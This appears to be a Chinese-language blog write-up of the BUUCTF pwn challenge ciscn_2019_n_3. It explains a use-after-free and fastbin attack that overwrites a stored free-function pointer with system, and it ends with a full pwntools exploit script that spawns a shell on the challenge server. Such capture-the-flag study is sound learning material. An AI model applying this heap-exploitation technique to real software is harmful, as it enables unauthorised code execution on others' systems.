---
title: "BUUCTF Pwn Ciscn_2019_n_3"
date: 2020-05-05T15:53:07+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Ciscn_2019_n_3

考点：

1、Use After Free

2、fastbin attack

小提示：程序存在alarm函数，可以使用IDA中的Keypatch插件来覆盖为nop减少调试时的干扰

![image-20200505162610729](D:\Github\myblog\static\images\image-20200505162610729.png)

功能有增、删、查，存在system

![image-20200505171311415](D:\Github\myblog\static\images\image-20200505171311415.png)

![image-20200505163835803](D:\Github\myblog\static\images\image-20200505163835803.png)

ask函数的作用是将我们输入的选择操作转为整形数据参与程序的判断

do_new()功能中最多可以创建16个chunk，创建chunk之后可以储存两种类型的数据，选项1是储存整形数据，选项2是储存字符串，在选项2中可以选择content chunk 的长度最大0x400，根据选择的不同有两种chunk结构

若选择1储存整形数据，则创建一个0xc大小的chunk，前4字节储存rec_int_print函数指针，4-8字节储存rec_int_free函数地址，8-12字节储存整形值

![image-20200505164443728](D:\Github\myblog\static\images\image-20200505164443728.png)

![image-20200505164511119](D:\Github\myblog\static\images\image-20200505164511119.png)

若选择2储存字符数据，则创建一个0xc大小的chunk，前4字节储存rec_str_print函数指针，4-8字节储存rec_str_free函数指针，8-12字节储存我们控制大小的chunk指针

![image-20200505164558646](D:\Github\myblog\static\images\image-20200505164558646.png)

![image-20200505164616317](D:\Github\myblog\static\images\image-20200505164616317.png)

大概的程序逻辑就是，使用do_del()功能是时候是调用储存在chunk中的rec_str_free函数指针，传入的参数也是储存在chunk中的8-12字节处的content chunk指针，在rec_str_free函数中free之后指针未置NULL存在UAF漏洞

![image-20200505162056612](D:\Github\myblog\static\images\image-20200505162056612.png)

所以在do_del()功能中执行的函数于我们选择的储存的数据有关，若存储整形数据则执行rec_int_free，若储存字符串数据则执行rec_str_free

![image-20200505164926144](D:\Github\myblog\static\images\image-20200505164926144.png)

从函数逻辑上看在执行rec_str_free的时候就是执行，rec_str_free(p_chunk(0xC))，所以这里利用UAF漏洞将储存rec_str_free函数指针的chunk空间修改为system函数，然后将p_chunk(0xC)指针所指向的chunk空间覆盖为"bash"或者"sh\x00\x00"，最后在对指针未置为NULL的chunk0的进行一次free的操作，相当于执行system("bash")或system("sh")

在具体利用上要结合fastbin的机制来，首先我们申请两次储存str的chunk0和chunk1要求是fastbin大小，然后再按chunk0，chunk1的顺序释放，这样fastbin->chunk1->chunk0，然后我们再申请一个0xC大小的chunk2，这样chunk2(0xC)中8-12字节chunk2 content指针指向的就是chunk0(0xC)，这样向chunk2 content写入内容实际上就是覆盖chunk0(0xC)，由于UAF的存在前面free的chunk0指针还纯在，我们再次free chunk0就会执行rec_str_free(p_chunk0(0xC))，但是由于储存rec_str_free函数指针被我覆盖成system的函数指针了，p_chunk0(0xC)被覆盖成了"bash\"或者"sh\x00\x00\"，所以实际执行的是system("bash\")，从而getshell

![image-20200505174422590](D:\Github\myblog\static\images\image-20200505174422590.png)

![image-20200505174717575](D:\Github\myblog\static\images\image-20200505174717575.png)

```python
#!/usr/bin/python2
#-*- coding=UTF-8 -*-
from pwn import *

context.log_level = 'debug'

if args.R:
    sh = remote('node3.buuoj.cn',28863)
else:
    sh = process('./ciscn_2019_n_3')
elf = ELF('./ciscn_2019_n_3')

def add(idx,types,size,content):
    sh.sendlineafter('> ','1')
    sh.sendlineafter('> ',str(idx))
    if types == 1:
        sh.sendlineafter('> ',str(types))
    else:
        sh.sendlineafter('> ',str(types))
        sh.sendlineafter('> ',str(size))
        sh.sendlineafter('> ',content)

def free(idx):
    sh.sendlineafter('> ','2')
    sh.sendlineafter('> ',str(idx))

def show(idx):
    sh.sendlineafter('> ','3')
    sh.sendlineafter('> ',str(idx))

if __name__=='__main__':
    add(0,2,32,'aaaa')
    add(1,2,32,'bbbb')
    #gdb.attach(sh)
    free(0)
    free(1)
    add(2,2,12,'bash'+p32(elf.symbols['system']))
    #gdb.attach(sh)
    free(0)
    sh.sendline('cat flag')
    sh.interactive()
```

![image-20200505175412733](D:\Github\myblog\static\images\image-20200505175412733.png)